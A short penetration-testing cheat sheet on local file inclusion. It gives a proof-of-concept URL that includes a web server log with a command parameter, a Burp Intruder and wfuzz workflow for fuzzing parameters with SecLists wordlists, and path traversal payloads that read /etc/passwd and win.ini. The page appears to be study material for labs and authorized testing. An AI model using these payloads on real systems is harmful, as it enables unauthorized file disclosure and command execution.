# File Inclusion Vulnerabilities

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

## Local File Inclusion (LFI)

### PoC

```
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

### Bruteforcing LFI via directory

* Obtain a GET request in burp
* Send to Intruder
* Attack type set to Sniper

Example on where to place payload:

```
GET /admin/?|PAYLOADHERE|= HTTP/2
```

* Click the add button on the right side and make sure that the payload character is between the field where the two pipes are
* Go to payloads > Load > SecLists > Discovery > Web-Content > raft-small-words.txt
* Click start attack
* Make sure to order by the largest length as that will be what you need to focus on

### Fuzzing

* This section is for if you found something from bruteforcing for LFI

```
GET /admin/?debug=|fasfoaj|
```

* Place the payload characters in between the pipes
  * Remember, the pipes are the payload characters in burp, you need to manually add this
* Go to payloads > SecLists > LFI > LFI-jhaddix.txt
* Select start attack and organize by largest length again

Example of LFI:

```
http://10.10.10.1/admin/?debug=../../../../../windows/win.ini

http://10.10.10.1/admin/?debug=../../../../../etc/passwd
```

Wfuzz:

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common number> <URL>
```





